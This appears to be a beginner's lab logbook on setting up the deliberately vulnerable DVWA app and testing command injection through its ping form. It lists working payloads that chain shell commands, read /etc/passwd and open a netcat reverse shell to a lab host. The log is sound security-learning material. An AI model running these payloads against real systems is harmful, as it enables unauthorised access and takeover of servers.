# Web-App-Hacking
A 3 week series of my journey in Web Application Hacking.


# The Foundry Logbook - Day 1

**Date:** 2026-04-15
**Focus:** Environment Setup & Command Injection Fundamentals

## 1. Environment Setup
- Installed Apache2, MySQL, PHP manually on Kali.
- Cloned DVWA from GitHub and configured `config.inc.php`.
- Set PHP `allow_url_include = On`.

## 2. First Exploit (Command Injection)
**Vulnerability:** The `ping` utility passes user input directly to the system shell without sanitization.

**Payloads Used:**
`127.0.0.1; ls -la`
`127.0.0.1; whoami`
`127.0.0.1; cat /etc/passwd`
`127.0.0.1; nc -e /bin/bash 10.0.2.4 4444`

**Result:** 
1. Directory listing of `/var/www/html/DVWA/vulnerabilities/exec/` was displayed, confirming arbitrary command execution.
2. Identity of the web server `www-data`.
3. A list of all users on the Linux box.
4. A reverse shell connection. Connects to my Kali box and gives me command line prompt on the server.

**Screenshot:**
![Command Injection Output screenshots]

## 3. Lessons Learned
- A semicolon (`;`) in a text box is a dangerous thing.
- The web server runs as `www-data` and can read system files like `/etc/passwd`.
- Manual installation teaches you about dependencies and file permissions.
- You can connect to another instance.
